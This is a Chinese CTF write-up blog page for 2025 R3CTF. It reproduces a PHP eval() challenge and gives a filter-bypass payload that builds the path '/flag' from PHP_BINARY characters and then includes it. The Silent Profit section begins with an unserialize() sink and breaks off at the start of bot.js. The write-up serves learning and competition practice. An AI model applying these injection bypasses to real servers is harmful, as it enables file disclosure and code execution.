@@ -1,0 +1,1501 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025R3CTF复现 Evalgelist 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 &lt;?php if (isset($_GET[&#39;input&#39;])) { echo &#39;&lt;div class=&#34;output&#34;&gt;&#39;; $filtered = str_replace([&#39;$&#39;, &#39;(&#39;, &#39;)&#39;, &#39;`&#39;, &#39;&#34;&#39;, &#34;&#39;&#34;, &#34;+&#34;, &#34;:&#34;, &#34;/&#34;, &#34;!&#34;, &#34;?&#34;], &#39;&#39;, $_GET[&#39;input&#39;]); $cmd = $filtered . &#39;();&#39;; echo &#39;&lt;strong&gt;After Security Filtering:&lt;/strong&gt; &lt;span class=&#34;filtered&#34;&gt;&#39; . htmlspecialchars($cmd) . &#39;&lt;/span&gt;&#39; . &#34;\\n\\n&#34;; echo &#39;&lt;strong&gt;Execution Result:&lt;/strong&gt;&#39; . &#34;\\n&#34;; echo &#39;&lt;div style=&#34;border-left: 3px solid #007bff; padding-left: 15px; margin-left: 10px;&#34;&gt;&#39;; try { ob_start(); eval($cmd); $result = ob_get_clean(); if (!empty($result)) { echo &#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed successfully!&lt;/span&gt;&#39; . &#34;\\n&#34;; echo htmlspecialchars($result); } else { echo &#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed (no output)&lt;/span&gt;&#39;; } } catch (Error $e) { echo &#39;&lt;span class=&#34;error&#34;&gt;❌ Error: &#39; . htmlspecialchars($e-&gt;getMessage()) . &#39;&lt;/span&gt;&#39;; } catch (Exception $e) { echo &#39;&lt;span class=&#34;error&#34;&gt;❌ Exception: &#39; . htmlspecialchars($e-&gt;getMessage()) . &#39;&lt;/span&gt;&#39;; } echo &#39;&lt;/div&gt;&#39;; echo &#39;&lt;/div&gt;&#39;; } ?&gt; get传input,过滤了这些\n">
+<title>2025R3CTF复现</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/2025r3ctf%E5%A4%8D%E7%8E%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="2025R3CTF复现">
+<meta property='og:description' content="2025R3CTF复现 Evalgelist 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 &lt;?php if (isset($_GET[&#39;input&#39;])) { echo &#39;&lt;div class=&#34;output&#34;&gt;&#39;; $filtered = str_replace([&#39;$&#39;, &#39;(&#39;, &#39;)&#39;, &#39;`&#39;, &#39;&#34;&#39;, &#34;&#39;&#34;, &#34;+&#34;, &#34;:&#34;, &#34;/&#34;, &#34;!&#34;, &#34;?&#34;], &#39;&#39;, $_GET[&#39;input&#39;]); $cmd = $filtered . &#39;();&#39;; echo &#39;&lt;strong&gt;After Security Filtering:&lt;/strong&gt; &lt;span class=&#34;filtered&#34;&gt;&#39; . htmlspecialchars($cmd) . &#39;&lt;/span&gt;&#39; . &#34;\\n\\n&#34;; echo &#39;&lt;strong&gt;Execution Result:&lt;/strong&gt;&#39; . &#34;\\n&#34;; echo &#39;&lt;div style=&#34;border-left: 3px solid #007bff; padding-left: 15px; margin-left: 10px;&#34;&gt;&#39;; try { ob_start(); eval($cmd); $result = ob_get_clean(); if (!empty($result)) { echo &#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed successfully!&lt;/span&gt;&#39; . &#34;\\n&#34;; echo htmlspecialchars($result); } else { echo &#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed (no output)&lt;/span&gt;&#39;; } } catch (Error $e) { echo &#39;&lt;span class=&#34;error&#34;&gt;❌ Error: &#39; . htmlspecialchars($e-&gt;getMessage()) . &#39;&lt;/span&gt;&#39;; } catch (Exception $e) { echo &#39;&lt;span class=&#34;error&#34;&gt;❌ Exception: &#39; . htmlspecialchars($e-&gt;getMessage()) . &#39;&lt;/span&gt;&#39;; } echo &#39;&lt;/div&gt;&#39;; echo &#39;&lt;/div&gt;&#39;; } ?&gt; get传input,过滤了这些\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/2025r3ctf%E5%A4%8D%E7%8E%B0/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-07-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-10T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/2025r3ctf%E5%A4%8D%E7%8E%B0/1.png' />
+<meta name="twitter:title" content="2025R3CTF复现">
+<meta name="twitter:description" content="2025R3CTF复现 Evalgelist 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 &lt;?php if (isset($_GET[&#39;input&#39;])) { echo &#39;&lt;div class=&#34;output&#34;&gt;&#39;; $filtered = str_replace([&#39;$&#39;, &#39;(&#39;, &#39;)&#39;, &#39;`&#39;, &#39;&#34;&#39;, &#34;&#39;&#34;, &#34;+&#34;, &#34;:&#34;, &#34;/&#34;, &#34;!&#34;, &#34;?&#34;], &#39;&#39;, $_GET[&#39;input&#39;]); $cmd = $filtered . &#39;();&#39;; echo &#39;&lt;strong&gt;After Security Filtering:&lt;/strong&gt; &lt;span class=&#34;filtered&#34;&gt;&#39; . htmlspecialchars($cmd) . &#39;&lt;/span&gt;&#39; . &#34;\\n\\n&#34;; echo &#39;&lt;strong&gt;Execution Result:&lt;/strong&gt;&#39; . &#34;\\n&#34;; echo &#39;&lt;div style=&#34;border-left: 3px solid #007bff; padding-left: 15px; margin-left: 10px;&#34;&gt;&#39;; try { ob_start(); eval($cmd); $result = ob_get_clean(); if (!empty($result)) { echo &#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed successfully!&lt;/span&gt;&#39; . &#34;\\n&#34;; echo htmlspecialchars($result); } else { echo &#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed (no output)&lt;/span&gt;&#39;; } } catch (Error $e) { echo &#39;&lt;span class=&#34;error&#34;&gt;❌ Error: &#39; . htmlspecialchars($e-&gt;getMessage()) . &#39;&lt;/span&gt;&#39;; } catch (Exception $e) { echo &#39;&lt;span class=&#34;error&#34;&gt;❌ Exception: &#39; . htmlspecialchars($e-&gt;getMessage()) . &#39;&lt;/span&gt;&#39;; } echo &#39;&lt;/div&gt;&#39;; echo &#39;&lt;/div&gt;&#39;; } ?&gt; get传input,过滤了这些\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/2025r3ctf%E5%A4%8D%E7%8E%B0/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#evalgelist">Evalgelist</a></li>
+    <li><a href="#silent-profit">Silent Profit</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/">
+                <img src="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/1.png"
+                        
+                        width="964" 
+                        height="1433" 
+                        loading="lazy"
+                        alt="Featured image of post 2025R3CTF复现" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" style="background-color: #2a9d8f; color: #fff;">
+                Wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/">2025R3CTF复现</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 10, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="2025r3ctf复现">2025R3CTF复现
+</h1><h2 id="evalgelist">Evalgelist
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div class=&#34;output&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nv">$filtered</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">([</span><span class="s1">&#39;$&#39;</span><span class="p">,</span> <span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;!&#34;</span><span class="p">,</span> <span class="s2">&#34;?&#34;</span><span class="p">],</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$filtered</span> <span class="o">.</span> <span class="s1">&#39;();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;strong&gt;After Security Filtering:&lt;/strong&gt; &lt;span class=&#34;filtered&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/span&gt;&#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;strong&gt;Execution Result:&lt;/strong&gt;&#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div style=&#34;border-left: 3px solid #007bff; padding-left: 15px; margin-left: 10px;&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">ob_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">eval</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$result</span> <span class="o">=</span> <span class="nx">ob_get_clean</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s1">&#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed successfully!&lt;/span&gt;&#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s1">&#39;&lt;span class=&#34;success&#34;&gt;✅ Function executed (no output)&lt;/span&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Error</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s1">&#39;&lt;span class=&#34;error&#34;&gt;❌ Error: &#39;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">())</span> <span class="o">.</span> <span class="s1">&#39;&lt;/span&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s1">&#39;&lt;span class=&#34;error&#34;&gt;❌ Exception: &#39;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">())</span> <span class="o">.</span> <span class="s1">&#39;&lt;/span&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>get传input,过滤了这些</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filtered</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">([</span><span class="s1">&#39;$&#39;</span><span class="p">,</span> <span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;!&#34;</span><span class="p">,</span> <span class="s2">&#34;?&#34;</span><span class="p">],</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$filtered</span> <span class="o">.</span> <span class="s1">&#39;();&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分号没过滤，可以拼接语句，把无参函数放在末尾，而且没禁用include,看<code>docker-entrypoint.sh</code>flag在根目录，而且就叫flag</p>
+<p>现在就是要获取<code>/</code>,发现某些常量可以用来拼字符串，比如 <code>PHP_BINARY</code>可以拿到<code>/</code> ,<code>a</code> 和 <code>l</code>,剩下的f和g可以直接裸字符。因为<code>PHP_BINARY</code>返回当前 PHP 解释器的完整绝对路径，web目录也是<code>/var/www/html</code>，所以可以直接获取这些字符</p>
+<p><strong>payload</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">include</span> <span class="nx">PHP_BINARY</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">f</span><span class="o">.</span><span class="nx">PHP_BINARY</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="nx">PHP_BINARY</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="nx">g</span><span class="p">;</span><span class="nx">getcwd</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面这个函数只要是无参就行</p>
+<h2 id="silent-profit">Silent Profit
+</h2><p>index.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bot.js</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
